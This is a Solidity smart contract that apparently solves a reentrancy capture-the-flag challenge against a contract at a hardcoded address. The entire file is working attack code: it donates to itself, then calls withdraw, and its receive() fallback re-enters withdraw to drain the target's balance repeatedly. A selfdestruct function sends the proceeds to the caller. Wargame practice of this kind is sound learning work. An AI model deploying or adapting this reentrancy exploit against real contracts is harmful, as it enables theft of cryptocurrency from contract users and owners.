// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/access/Ownable.sol";

pragma solidity >=0.8.2 <0.9.0;

interface IReentrance {
    function withdraw(uint256 _amount) external;
    function donate(address _to) external payable;
}

contract AttackReentrant {

    IReentrance public reentranceInstance = IReentrance(payable(0xDbf03d3ae431cE518078F706361ef6e834150713));

    constructor() payable {
        // Donate 0.001 to ourselfes
        reentranceInstance.donate{value: 0.001 ether}(address(this));
    }

    function withdraw() external {
        // Withdraw the 0.001
        reentranceInstance.withdraw(0.001 ether);
    }

    function destroy() public {
        selfdestruct(payable(msg.sender));
    }


    receive() external payable {
        // Reenter and withdraw again the 0.001 of the contract
        reentranceInstance.withdraw(0.001 ether);
    }

}
